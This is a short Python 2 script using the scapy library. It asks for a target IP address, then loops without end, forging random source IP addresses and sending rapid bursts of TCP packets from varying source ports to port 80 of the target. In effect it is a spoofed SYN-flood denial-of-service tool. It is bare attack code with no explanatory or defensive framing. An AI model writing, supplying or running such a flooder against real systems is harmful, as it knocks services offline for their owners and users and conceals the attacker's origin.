import random
from scapy.all import *
target = raw_input("Enter the Target IP ")

i=1
while True: 
	a = str(random.randint(1,254))
	b = str(random.randint(1,254))
	c = str(random.randint(1,254))
	d = str(random.randint(1,254))
	dot = "."
	src = a+dot+b+dot+c+dot+d
	print src
	st = random.randint(1,1000)
	en = random.randint(1000,65535)
	loop_break = 0
	for srcport in range(st,en): 
		IP1 = IP(src=src, dst=target)
		TCP1 = TCP(sport=srcport, dport=80)
		pkt = IP1 / TCP1
		send(pkt,inter= .0001)
		print "packet sent ", i
		loop_break = loop_break+1
		i=i+1
		if loop_break ==50 :
			break
